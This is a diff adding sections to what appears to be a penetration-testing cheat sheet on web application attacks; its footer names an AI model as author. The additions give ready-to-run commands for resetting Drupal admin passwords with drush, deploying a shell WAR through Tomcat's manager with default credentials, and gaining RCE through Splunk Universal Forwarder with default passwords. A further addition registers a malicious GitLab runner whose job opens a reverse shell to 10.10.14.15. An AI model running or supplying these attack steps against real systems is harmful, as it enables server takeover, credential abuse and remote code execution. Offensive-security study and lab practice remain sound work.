@@ -225,6 +225,25 @@ tar cvf captcha.tar.gz captcha/
 curl 'http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id'
 ```
 
+**drush — Drupal CLI (post-shell on server):**
+
+```bash
+# If you have a shell on the server and Drupal is installed, drush gives DB-level control
+
+# Reset admin password (common post-shell escalation)
+drush user-password admin "newpass123"
+drush upwd admin --password="newpass123"   # older drush syntax
+
+# Enable PHP filter module (needed for PHP code execution via node)
+drush en php -y
+
+# List users
+drush uinf --uid=1
+
+# Full path if drush not in $PATH
+/var/www/html/vendor/drush/drush/drush user-password admin "newpass123"
+```
+
 **CVEs (Drupalgeddon):**
 - Drupalgeddon (SA-CORE-2014-005) — SQLi → RCE — Drupal < 7.32
 - Drupalgeddon2 (CVE-2018-7600) — Unauthenticated RCE — Drupal < 7.58 / 8.x < 8.3.9
@@ -299,6 +318,17 @@ set RHOSTS 10.10.10.10
 set HttpUsername tomcat
 set HttpPassword tomcat
 run
+```
+
+**WAR deploy via curl (no browser needed):**
+
+```bash
+# Deploy using /manager/text endpoint — fully scriptable
+curl -u tomcat:tomcat "http://target.com:8080/manager/text/deploy?path=/shell&update=true" --upload-file shell.war
+# Access: http://target.com:8080/shell/
+
+# Undeploy
+curl -u tomcat:tomcat "http://target.com:8080/manager/text/undeploy?path=/shell"
 ```
 
 **CVE-2020-1938 — Ghostcat (AJP LFI):**
@@ -441,6 +471,31 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
+**Splunk Universal Forwarder — management port RCE (port 8089):**
+
+```bash
+# UF management port often uses default or weak creds (admin:changeme, admin:admin)
+# Check if management port is open
+nmap -p 8089 target.com
+
+# Verify access
+curl -sk -u admin:changeme https://target.com:8089/services/server/info
+
+# Deploy a search command that executes OS code via the REST API
+# 1. Create a malicious app on attacker server (same structure as above)
+# 2. POST app package to UF via management API
+curl -sk -u admin:changeme https://target.com:8089/services/apps/local \
+  -d 'name=splunk_shell&filename=true' \
+  --data-urlencode 'update=true'
+
+# Simpler — PySplunkWhisperer2 automates UF RCE
+git clone https://github.com/cnotin/SplunkWhisperer2
+python3 PySplunkWhisperer2/PySplunkWhisperer2_remote.py \
+  --host target.com --port 8089 \
+  --username admin --password changeme \
+  --lhost 10.10.14.15 --lport 4444
+```
+
 > [!note]
 > Splunk forwarder agents running on servers also accept app deployments if you have management port access. Even without the web UI, a compromised forwarder = RCE on that host.
 
@@ -545,6 +600,33 @@ searchsploit gitlab
 python3 exploit.py -t http://target.com -l 10.10.14.15 -p 4444
 # https://github.com/inspiringz/CVE-2021-22205
 ```
+
+### GitLab Runner Token Abuse
+
+If you gain shell on a GitLab server or CI runner host, runner tokens allow registering a malicious runner that executes arbitrary commands in pipeline jobs.
+
+```bash
+# Runner token stored in config file on the runner host
+cat /etc/gitlab-runner/config.toml
+# Look for: token = "glrt-..."
+
+# Register a malicious runner pointing at your attacker instance
+# (requires the registration token from GitLab UI: Settings → CI/CD → Runners)
+gitlab-runner register \
+  --non-interactive \
+  --url http://target.com \
+  --registration-token <reg_token> \
+  --executor shell \
+  --description "attacker-runner"
+
+# After registration — the runner executes all matching pipeline jobs as the OS user
+# Add a .gitlab-ci.yml to any project using this runner:
+# job:
+#   script:
+#     - bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
+```
+
+> [!note] Runner tokens found in `config.toml` are *authentication* tokens — they allow the runner to poll for jobs. Registration tokens (from the UI) are needed to register new runners. Both are valuable: auth tokens let you impersonate the runner and receive pipeline jobs.
 
 ---
 
@@ -1240,5 +1322,5 @@ curl -sk -X POST 'https://target.com:17778/SolarWinds/InformationService/v3/Json
 ---
 
 *Created: 2026-03-20*
-*Updated: 2026-03-20*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
